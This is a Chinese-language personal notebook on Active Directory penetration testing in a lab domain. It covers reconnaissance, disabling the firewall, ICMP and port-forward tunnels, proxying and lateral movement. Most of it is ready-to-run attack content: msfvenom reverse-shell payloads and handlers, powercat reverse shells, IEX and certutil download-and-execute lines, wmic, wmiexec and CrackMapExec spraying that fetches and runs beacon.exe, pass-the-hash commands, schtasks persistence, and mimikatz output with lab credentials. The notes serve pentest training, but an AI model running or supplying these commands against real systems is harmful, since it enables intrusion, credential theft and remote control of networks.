# 内网域渗透笔记

## 域内常见名词

工作组、单域、多域、域森林、域名服务器 DNS、DC 域控、AD 活动目录、DMZ  隔离区

## 域内的各种权限

首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。

#### 域本地组

成员范围：所有的域；使用范围：自己所在的域

#### 全局组

成员范围：自己所在的域；使用范围：所有的域

#### 通用组

成员范围：所有的域；使用范围：所有的域

#### A-G-DL-P 策略

A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。

A 表示用户账号
G 表示全局组
U 表示通用组
DL 表示域本地组
P 表示资源权限
<img src=".\图片\Snipaste_2022-12-11_16-05-49.png" alt="Snipaste_2022-12-11_16-05-49" style="zoom:80%;" />

## 本地工作组信息收集

### 基础命令

- 操作系统和版本信息（英文版）

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
```

- 操作系统和版本信息（中文版）

```
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
```

- 查看系统体系结构

```
echo %PROCESSOR_ARCHITECTURE%
```

- 查看系统所有环境变量

```
set
```

- 查看安装的软件及版本和路径等信息

```
wmic product get name,version
```

- 利用 PowerShell 收集软件版本信息

```
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"
```

- 查询本机服务信息

```
wmic service list brief
```

- 查询进程列表

```
tasklist /v
```

- wmic 查看进程信息

```
wmic process list brief
```

- 查看启动程序信息

```
wmic startup get command,caption
```

- 查看计划任务

```
schtasks /query /fo LIST /v
```

- 查看主机开启时间

```
net statistics workstation
```

- 查询用户列表

```
net user
```

- 查看指定用户的信息

```
net user web
```

- 查看本地管理员用户

```
net localgroup administrators
```

- 查看当前在线用户

```
query user || qwinsta
```

- 列出或断开本地计算机和连接的客户端的会话

```
net session
```

- 查看端口列表

```
netstat -ano
```

- 查看补丁列表

```
systeminfo
```

- 使用 wmic 查看补丁列表

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- 查看本机共享

```
net share
```

<img src=".\图片\Snipaste_2022-12-11_16-34-43.png" alt="Snipaste_2022-12-11_16-34-43" style="zoom: 80%;" />

- 使用 wmic 查看共享列表

```
wmic share get name,path,status
```

- 查询路由表及所有可用接口的ARP 缓存表

```
route print
arp –a
```

- 查看计算机代理配置情况

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### 防火墙相关

关闭防火墙

```
netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)
netsh advfirewall set allprofiles state off	(Windows Server 2003 系统及之后版本)
```

查看防火墙配置

```
netsh firewall show config
```

 修改防火墙配置        

```
(Windows Server 2003 系统及之前版本)
允许指定程序全部连接
netsh firewall add allowedprogram c:\nc.exe "allow nc" enable

(Windows Server 2003 之后系统版本)
允许指定程序连入
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe"

允许指定程序连出
netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe"

允许 3389 端口放行
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

自定义防火墙日志储存位置

```
netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"
```

### 查询并开启远程连接服务

- 查看远程连接端口（0xd3d换成10进制即3389）

```
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

- 在Windows Server 2003 中开启3389 端口

```
wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
```

- 在Windows Server 2008 和Windows Server 2012 中开启3389 端口

```
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1

wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

### 自动收集工作组信息脚本

wmic 脚本下载地址：https://www.fuzzysecurity.com/scripts/files/wmic_info.rar

搜集完成后会在当前目录生成   out.html             [.\图片\out.html]()

<img src=".\图片\Snipaste_2022-12-11_16-57-40.png" alt="Snipaste_2022-12-11_16-57-40" style="zoom: 67%;" />



## 域内信息搜集

### 信息搜集命令大全图片

<img src=".\图片\9dxsuZWjbEPQMl2vx1HSBA.png" alt="9dxsuZWjbEPQMl2vx1HSBA" style="zoom: 33%;" />

<img src=".\图片\image-202212111700ss41788.png" alt="image-20221211170041788" style="zoom: 33%;" />

### 判断是否存在域

```
ipconfig /all
主机名  . . . . . . . . . . . . . : WebServer
主 DNS 后缀 . . . . . . . . . . . : god.org
节点类型  . . . . . . . . . . . . : 混合
IP 路由已启用 . . . . . . . . . . : 否
WINS 代理已启用 . . . . . . . . . : 否
DNS 后缀搜索列表  . . . . . . . . : god.org 
...........
```

```
net view /domain
net time /domain
```

使用 net time /domain 后 ping 一下主机名，则可以定位域控 ip

<img src=".\图片\Snipaste_2022-12-11_17-25-47.png" alt="Snipaste_2022-12-11_17-25-47"  />

### 收集域内基础信息

```
net localgroup administrators 来查看本机管理员用户（通常包含域用户）
net user /domain  来查看域内用户
net group /domain 来查看域内工作组
net group "domain controllers" /domain 查看域控
net group "domain admins" /domain 查看域内管理员
net localgroup administrators /domain 查看域管理员
net accounts /domain 查看域密码策略
nltest /domain_trusts  查看域信任信息
wmic useraccount get /all 查询域用户详细信息
dsquery user 查询存在的用户
nltest /DCLIST:god 查找域控机器名
netdom query pdc  查看域控器主机名
type c:\Windows\system32\drivers\etc\hosts  查看hosts文件
ping、curl、nslookup     查看是否出网
```

我们还需要查看域内存活主机的ip和端口信息，这个和我们常规搜集的手法差不多，基于tcp/icmp/arp的主机存活探测，nmap、masscan的端口扫描，可能会涉及到一些代理技术。此外，我们还可以搜集一些其它重要信息

```
1.站点源码备份文件、数据库备份文件等
2.各类数据库Web管理入口，如PHPMyAdmin
3.浏览器保存密码、浏览器Cookies
4.其他用户会话、3389和ipc$连接记录、回收站内容
5.Windows 保存的WIFI密码
6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等
7.旨在收集各种密文，hash，明文，口令等，为后续横向渗透做好测试准备
...
```

### SPN服务主体名称

SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs 和Rubeus。利用Windows自带的setspn工具，普通域用户权限执行即可：

```
setspn -T god.org -Q */*
```

<img src=".\图片\Snipaste_2022-12-12_12-51-09.png" alt="Snipaste_2022-12-12_12-51-09" style="zoom:60%;" />



### 定位域控及一些脚本工具

#### Adfind

<img src=".\图片\Snipaste_2022-12-11_18-01-13.png" alt="Snipaste_2022-12-11_18-01-13" style="zoom: 80%;" />

Adfind的常见命令

```
#列出域控制器名称
AdFind -sc dclist 
#查询当前域中在线的计算机
AdFind -sc computers_active
#查询当前域中在线的计算机(只显示名称和操作系统)
AdFind -sc computers_active name operatingSystem
#查询当前域中所有计算机
AdFind -f "objectcategory=computer"
#查询当前域中所有计算机(只显示名称和操作系统)
AdFind -f "objectcategory=computer" name operatingSystem
#查询域内所有用户
AdFind -users name
#查询所有GPO
AdFind -sc gpodmp 
```

#### Cobalt Strike中的Beacon

•PowerView（[https://](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)[github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) ）是对域进行枚举的实用工具

导入PowerView

在Beacon交互中：powershell-import PowerView.ps1

在Powershell中：ipmo PowerView.ps1

<img src=".\图片\Snipaste_2022-12-11_18-36-57.png" alt="Snipaste_2022-12-11_18-36-57" style="zoom:60%;" />

```
powershell (powerpick) get-netdomain  枚举域
powershell Get-NetDomainController |select Forest, Name, OSVersion | fl  枚举DC
powershell get-netforestdomain 枚举森林
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess  枚举域策略
powershell get-netuser | select samaccountname 枚举域用户
powershell get-netcomputer 枚举域主机
powershell get-netou| select name 枚举OU
powershell get-netgroup| select samaccountname 枚举组
powershell get-netgroupmember –identity “Domain Admins” 枚举组成员
powershell get-netgpo| select displayname 枚举GPO
powershell Find-DomainUserLocation | select UserName, SessionFromName 枚举用户位置
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName 枚举会话
powershell get-netdomaintrust 枚举域信任
powershell get-netuser –spn | select samaccountname 枚举设置了SPN的用户
powershell get-netuser –preauthnotrequired | select samaccountname 枚举无需预认证的用户
powershell find-domainshare -checkshareaccess 枚举可访问的SMB Share
powershell get-netcomputer –unconstrained | select dnshostname, samaccountname 枚举被设置了非约束委托的主机
powershell get-netcomputer –trustedtoauth | select dnshostname, samaccountname, msds-allowedtodelegateto
枚举被设置了约束委托的主机
```

#### 寻血猎犬BloodHound

使用SharpHound.exe或者SharpHound.ps1到目标机上面执行，会在当前目录生成 时间戳_BloodHound.zip 的文件，然后再导入到BloodHound查看

##### 生成时间戳XXX.zip 的文件

```
C:\Users\daniel10>SharpHound.exe -c all     # .exe版本
```

```
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"  # .ps1版本
```

##### 导入 BloodHound 主机上

采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。

<img src=".\图片\Snipaste_2022-12-11_22-15-42.png" alt="Snipaste_2022-12-11_22-15-42" style="zoom: 50%;" />

## windows防火墙

### 规则

规则的对象为本机，一般来说入站规则比较严谨限制较多，而出站规则就较为轻松

入站：外来机器访问本机，如访问web页面

出站：本机访问外来机器，如反弹shell

<img src=".\图片\Snipaste_2022-12-12_13-13-17.png" alt="Snipaste_2022-12-12_13-13-17"  />



### 组策略

当域控DC设置了防火墙策略后，可以在域控机器的组策略管理器新建策略，可以使域内其它主机生效这个防火墙规则，哪怕其它主机没有配置这个规则也会强制生效

<img src=".\图片\Snipaste_2022-12-12_13-19-19.png" alt="Snipaste_2022-12-12_13-19-19" style="zoom: 67%;" />

### 被限制时的思路

目标机防火墙限制出站TCP时，可以选择msf/cs木马的正向连接，或者使用隧道技术

目标机防火墙限制入站时，可以选择木马反向连接，隧道技术能否成功视情况而定，看限制得多不多

## 隧道技术

隧道的利用场景，当我们遇到目标机防火墙建封了一些入站、出站的协议，比如 tcp 、dns等等，导致我们后门无法上线，我们可以借助一些隧道工具把 tcp 流量转化成 icmp 或其它流量出站

### icmp隧道

#### 场景 1

场景：当目标机的tcp出网被限制，浏览器无法访问baidu.com，但是却可以ping通baidu.com，我们又想生成一个反向连接的木马，该如何下手？

工具：https://github.com/esrrhs/pingtunnel

思路：就是利用木马将上线流量发送到本地工具端口，工具转换为ICMP流量转到攻击机，攻击机使用工具将收到的icmp流量转化为tcp流量，攻击机接收到上线tcp流量从而上线

举例：木马为127.0.0.1 4444端口 ,肉鸡工具监听本地4444端口接收到tcp流量，然后转换为icmp流量发送到攻击机6666端口，攻击机工具将icmp流量转为tcp流量而监听器刚好监听本机6666端口从而上线

##### step 1 ：cs生成两个监听器

<img src=".\图片\Snipaste_2022-12-12_15-02-40.png" alt="Snipaste_2022-12-12_15-02-40"  />

##### step 2：生成监听器5555的Stager后门

生成后放在肉鸡上运行

##### step 3：pingtunnel 登场

攻击机kali运行

```
./pingtunnel -type server
```

肉鸡运行

```
pingtunnel.exe -type client -l 127.0.0.1:5555 -s 192.168.0.103 -t 192.168.0.103:6666 -tcp 1 -noprint 1 -nolog 1
```

##### step 3：发现已经上线

此时上线的是监听器6666的后门

<img src=".\图片\Snipaste_2022-12-12_15-09-13.png" alt="Snipaste_2022-12-12_15-09-13" style="zoom:80%;" />

### lcx 使用

当 tcp、udp 流量被大量拦截时，我们可以用端口转发工具 lcx

#### 内网端口转发

192.168.3.31 假设为公网跳板机

```
内网失陷主机运行
lcx.exe -slave 192.168.3.31 4444 127.0.0.1 3389
```

```
（公网）代理主机运行
lcx.exe -listen 4444 5555
```

此时访问公网跳板机的 192.168.3.31:5555 ，就相当于访问量内网失陷主机的 3389端口

#### 本地端口映射

如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问

```
lcx.exe -tran 53 <目标主机 IP 地址> 3389
```

#### linux 用 portmap

```
内网失陷主机
./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 <公网主机 IP> -p2 4444

公网代理主机
./portmap -m 2 -p1 4444 -h2 <公网主机 IP> -p2 5555
```

### smb隧道

smb是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等，smb是开放445端口

这里使用cs来操作，smb监听器不能生成木马，因为它并没有目标地址和端口,而是建立smb隧道,让后借助横向移动的方法达到上线

<img src=".\图片\Snipaste_2022-12-13_14-53-56.png" alt="Snipaste_2022-12-13_14-53-56" style="zoom:80%;" />

在已经攻陷的主机192.168.0.102 webserver中执行网络端口嗅探，在目标列表发现192.168.3.21 域控存活，再实现psexec64进行横向移动，然后上线

<img src=".\图片\Snipaste_2022-12-13_15-00-51.png" alt="Snipaste_2022-12-13_15-00-51" style="zoom:50%;" />

## 代理技术

代理的利用场景，在已攻陷的主机上建立代理，使外网的 win10 能联通已攻陷主机的内网里的主机，方便我们 win10 上的工具渗透和 kali 后门上线

```
kali: 192.168.0.103
win10: 192.168.0.101
webserver : 192.168.0.102  192.168.3.31  # 2张网卡
dc: 192.168.3.21
```

我们想要 win10、kali 能和 dc 通讯 ，还要 dc 可以上线 msf和 cs 

#### msf：

先用msf上线 webserver

```
msfvenom - p windows/metmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=3333 -f exe > 3333.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3333
exploit
```

##### 通讯

```
meterpreter > run autoroute -p 在session会话中查看当前路由
meterpreter > run post/multi/manage/autoroute 建立路由
meterpreter > background 保留并推出当前的session会话
msf6 exploit(multi/handler) > search socks 查找socks模块
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy  选择并使用该socks_proxy模块
msf6 auxiliary(server/socks_proxy) > show options 查看模块选项
msf6 auxiliary(server/socks_proxy) > set srvport 5577  设置代理端口为 Ubuntu IP的5577端口
msf6 auxiliary(server/socks_proxy) > run 启动socks会话
```

在 win10 上运行 Proxifler 代理工具

<img src=".\图片\Snipaste_2022-12-12_16-50-17.png" alt="Snipaste_2022-12-12_16-50-17" style="zoom: 67%;" />

win10 访问到 dc

<img src=".\图片\Snipaste_2022-12-12_16-49-46.png" alt="Snipaste_2022-12-12_16-49-46" style="zoom:67%;" />

##### proxychains

另外使用 proxychains 代理工具也可以完成通讯，使用简介

 https://www.jianshu.com/p/b08df324cee7

 https://blog.csdn.net/qq_53086690/article/details/121779832

<img src=".\图片\Snipaste_2022-12-13_12-30-30.png" alt="Snipaste_2022-12-13_12-30-30" style="zoom: 50%;" />

##### 上线

生成正向后门

```
#后门生成
msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe > 3333.exe
#监听
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set rhost 192.168.3.21
set lport 3333
run
```

如果生成反向后门就可以用隧道或者端口转发工具

#### cs：

先生成后门控制 webserver

##### 通讯

<img src=".\图片\Snipaste_2022-12-12_17-18-15.png" alt="Snipaste_2022-12-12_17-18-15" style="zoom:50%;" />

再配置代理工具 proxychains4 或者 Proxifler，即可完成通讯

##### 上线

正向连接，生成 Beacon TCP

<img src=".\图片\Snipaste_2022-12-12_17-26-40.png" alt="Snipaste_2022-12-12_17-26-40" style="zoom:50%;" />

然后使用CS与之前上线的 webadmin 主机进行交互会话beacon中，使用命令

connect 192.168.3.21 4322 即可完成上线

反向连接的话，使用转发上线，这里的监听地址配置为 webadmin 与 dc 同一网段的IP

报存后利用该监听器生成后门，上传至 dc ，运行后即可上线

<img src=".\图片\Snipaste_2022-12-12_17-33-33.png" alt="Snipaste_2022-12-12_17-33-33" style="zoom:80%;" />

<img src=".\图片\Snipaste_2022-12-13_11-53-39.png" alt="Snipaste_2022-12-13_11-53-39" style="zoom:60%;" />

#### powercat

powercat 可以视为 nc 的 [powershell](https://so.csdn.net/so/search?q=powershell&spm=1001.2101.3001.7020) 版本，因此也可以和 nc 进行连接

https://github.com/besimorhino/powercat

教程https://blog.csdn.net/qq_37683287/article/details/117445406

##### 导入powercat

在powershell里导入

```
 Import-Module .\powercat.ps1
```

如果显示未能加载指定模块，则可能是权限问题，在管理员模式下运行以下命令

```
Set-ExecutionPolicy Unrestricted
```

如果没有权限，也可以直接下载远程文件进行绕过

```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

##### powercat 命令参数

```
-l		监听模式
-p		指定监听端口
-e		指定启动进程的名称
-v		显示详情
-c		指定想要连接的 IP 地址
-ep		返回 powershell
-dns	使用 dns 通信
-g		生成 payload
-ge		生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload
```

##### 正向连接

kali 192.168.0.103 来正向连接webserver 192.168.0.102

```
powercat -l -v -p 4444 -e cmd.exe  #webserver执行
```

```
nc -v 192.168.0.102 4444 #kali执行
```

<img src=".\图片\Snipaste_2022-12-13_15-22-06.png" alt="Snipaste_2022-12-13_15-22-06"  />

我这里显示连接被拒绝，可能是 webserver 的防火墙设置了限制入站

##### 反向连接

webserver 192.168.0.102 来反向连接 kali 192.168.0.103

```
powercat -c 192.168.0.103 -p 4444 -e cmd.exe #webserver执行
nc -lvp 4444  #kali执行
```

<img src=".\图片\Snipaste_2022-12-13_15-26-03.png" alt="Snipaste_2022-12-13_15-26-03"  />

##### 返回 powershell

```
powercat -l -v -p 4444 #攻击机运行
```

```
powercat -c 172.16.214.21 -p 4444 -v -ep #靶机运行
```

##### 作为跳板使用

```
kali: 192.168.0.103
webserver : 192.168.0.102  192.168.3.31  # 2张网卡
dc: 192.168.3.21
```

我们想让kali能连接上dc,，于是把webserver（已攻陷）当做跳板

```
powercat -l -v -p 4444 -e cmd.exe  #dc运行
powercat -l -v -p 5555 -r tcp:192.168.3.21:4444  #webserver运行
nc -v 192.168.0.102 5555  #kali运行
```

<img src=".\图片\Snipaste_2022-12-13_15-38-35.png" alt="Snipaste_2022-12-13_15-38-35"  />

还是拒绝，我们是 kali--->webserver--->dc ，正向连接出了问题

##### 生成payload

https://blog.csdn.net/qq_37683287/article/details/117445406

## 内网穿透，搭建隧道

### nps工具

https://github.com/ehang-io/nps

使用说明 https://www.yevpt.com/post/45

我们想要实现一台在内网的主机 kali  能控制 另一个在内网的 目标机，这时该怎么办呢？

首先，我们必须要一台外网的服务器，服务器和本地kali同时配置nps，生成 （lhost=隧道服务器IP lport=5555"）的后门，nps会把本地kali 6666的端口穿透到服务器 5555端口上，我们监听 本地kali 6666 的端口便可以上线

```
服务端常用命令:

# 服务端开始/停止/重启/配置文件重载/卸载服务/安装服务
sudo nps start/stop/restart/reload/uninstall/install
#  服务端更新

sudo nps-update update (请更新前停止服务)
```

```
-服务端：
./nps install //安装依赖
./nps //开启服务
访问 隧道服务器IP:8080 登录账密默认 admin 123
创建客户端，生成密钥
添加协议隧道，绑定指向
远程绑定 5555 指向本地6666

-客户端：
1、连接服务端：./npc -server=隧道服务器IP:8024 -vkey=生成的密钥
2、生成后门：msfvenom -p windows/meterpreter/reverse_tcp lhost=隧道服务器IP lport=5555 -f exe -o nps.exe
3、监听后门：
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 6666
run
```

相似的工具还有一些，详细信息再搜教程使用

https://github.com/fatedier/frp

https://github.com/esrrhs/spp

## 横向移动

### IPC

IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。可以对目标机进行文件相关操作，也可以执行一些命令

#### 条件

需要目标机开启 139、445 端口

目标机要开启 IPC$ 默认共享

需要目标机用户名密码

#### 利用

```
net use \\192.168.3.21\ipc$ "Admin12345" /user:administrator #建立 IPC 连接
net use \\server\ipc$ "password" /user:username # 工作组
net use \\server\ipc$ "password" /user:domain\username #域内
dir \\192.168.3.21\C$\        # 查看文件列表
copy \\192.168.3.21\C$\1.bat 1.bat # 下载文件
copy 1.bat \\192.168.3.21\C$ # 复制文件
net use \\192.168.3.21\C$\1.bat /del # 删除IPC
net view 192.168.3.21        # 查看对方共享
net use t: \\192.168.3.21\c$  #映射磁盘到本地
dir \\192.168.3.21\c$   #dir 列出c盘目录
tasklist /S 192.168.3.21 /U administrator /P Admin12345  #查看进程
net use \\192.168.3.21\ipc$ /del #断开连接
net use #查看当前建立的连接
```

<img src=".\图片\Snipaste_2022-12-12_20-36-14.png" alt="Snipaste_2022-12-12_20-36-14" style="zoom: 67%;" />

### 计划任务

Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了

#### at

```
1、at < Windows2012
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator # 建立ipc连接：
copy beacon.exe \\192.168.3.21\c$  #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\beacon.exe   #添加计划任务
```

#### schtasks

```
2、schtasks >=Windows2012 （192.168.3.21为已取得的主机，192.168.3.32为目标机）
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator # 建立ipc连接：
copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件
schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务
schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务
```

#### 使用套件 Impacket

exe版：https://gitee.com/RichChigga/impacket-examples-windows

Py版：https://github.com/SecureAuthCorp/impacket

```
#CS本地用户明文连接：
shell atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"

#CS域内用户明文连接：
shell atexec.exe god/administrator:Admin12345@192.168.3.21 "ver"

#CS域内本地用户明文密文连接：
shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"
```

<img src=".\图片\Snipaste_2022-12-12_20-56-01.png" alt="Snipaste_2022-12-12_20-56-01" style="zoom: 80%;" />

假如我们已经攻陷的主机里没有python，怎么办？显然不能直接下载，这时我们可以用 cs开启代理+Proxifler 的模式使用

### WMI

WMI是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。

#### wmic

非交互执行，意思是下载http://192.168.3.31/beacon.exe到192.168.3.32的c:/beacon.exe，然后执行beacon.exe

192.168.3.32为目标机，192.168.3.31为已经攻陷的主机

```
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"

wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe c:/beacon.exe"
```

#### cscript

内置：(交互式)，上传wmiexec.vbs

```
cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
```

此时会跳出来个cmd

#### 套件 wmiexec-impacket

```
外部：(交互式&单执行)
wmiexec ./administrator:Admin12345@192.168.3.21 "whoami"
wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
下载后门：
wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
执行后门：
wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c c:/beacon.exe"
```

<img src=".\图片\Snipaste_2022-12-12_21-35-27.png" alt="Snipaste_2022-12-12_21-35-27" style="zoom: 80%;" />

### SMB服务

利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放

#### psexec

需要在本机shell环境执行还需要管理员权限

```
内部：(交互式 windows官方工具)
psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd

外部：(交互式 外人开发的工具)
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
```

#### smbexec-impacket套件

外部：(交互式) ./username为本地用户， god/username 为域用户，在实战中都要尝试(有可能域和本地密码相同，或内网本地密码统一)

```
外部：(交互式)
smbexec ./administrator:admin!@#45@192.168.3.32
smbexec god/administrator:admin!@#45@192.168.3.32

smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32

smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32
smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32
```

#### services

内置：(单执行) –无回显

```
services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe

services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell
```

### 密码喷射CrackMapExec

这个密码喷射的道理是抓取一堆账号和密码，再指定一堆域内主机的ip，然后通过暴力枚举，碰到正确的就能得到shell或者上线cs

下载：
https://github.com/Porchetta-Industries/CrackMapExec/releases

安装：
https://wiki.porchetta.industries/getting-started/installation

使用：
https://wiki.porchetta.industries/
https://www.freebuf.com/sectool/184573.html

https://www.jianshu.com/p/86fa18878327

https://www.cnblogs.com/Yang34/p/14411497.html

```
密码喷射域登录：
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45'

密码喷射本地登录：
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' --local-auth

密码喷射本地登录命令执行：
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'Admin12345' -x 'whoami' --local-auth

密码喷射本地登录命令执行上线：
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' -x 'cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe & c:/4455.exe' --local-auth

密码喷射域登录命令执行上线：
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p 'admin!@#45' -x 'cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe & c:/4455.exe'

密码喷射本地&域登录命令执行全自动上线：
proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -p pass.txt -x 'cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe & c:/4455.exe'
proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt -x 'cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe & c:/4455.exe' --local-auth
```

<img src=".\图片\Snipaste_2022-12-13_13-35-14.png" alt="Snipaste_2022-12-13_13-35-14"  />

至于为什么能抓到其它域用户的账号和密码，是因为其它域主机与当前已经攻陷的域主机建立过通讯，所以已经攻陷的域主机缓存了它们的账号密码。

proxychains的使用：

https://blog.csdn.net/qq_53086690/article/details/121779832

 https://www.jianshu.com/p/b08df324cee7

### PTH哈希传递

PTH，通过**密码散列值** (通常是NTLM Hash)来进行攻击，利用的lm或ntlm的值进行的渗透测试（**NTLM认证攻击**）

在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账号和密码。

因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在Window Server 2012 R2之前使用到的密码散列值是LM、NTLM，在2012 R2及其版本之后使用到的密码散列值是NTLM Hash。

PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。

如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。

打了**KB2871997补丁**后的影响：没打补丁用户都可以连接，打了补丁只能administrator连接

#### Mimikatz

cs点击抓取明文密码（system权限），我们需要的是 NTLM  哈希值

<img src=".\图片\Snipaste_2022-12-13_16-23-24.png" alt="Snipaste_2022-12-13_16-23-24" style="zoom:60%;" />

```
Authentication Id : 0 ; 950373 (00000000:000e8065)
Session           : NewCredentials from 1
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/12/13 14:59:42
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : administrator
	 * Domain   : ogd.org
	 * LM       : ac804745ee68ebea48116059303a4365
	 * NTLM     : ccef208c6485269c20db2cad21734fe7  #关注HTLM
	 * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9
	tspkg :	
	 * Username : administrator
	 * Domain   : ogd.org
	 * Password : Admin12345
	wdigest :	
	 * Username : administrator
	 * Domain   : ogd.org
	 * Password : Admin12345
	kerberos :	
	 * Username : administrator
	 * Domain   : ogd.org
	 * Password : Admin12345
	ssp :	
	credman :	#详情见 .\图片\webadmin抓取密码凭证.txt
```

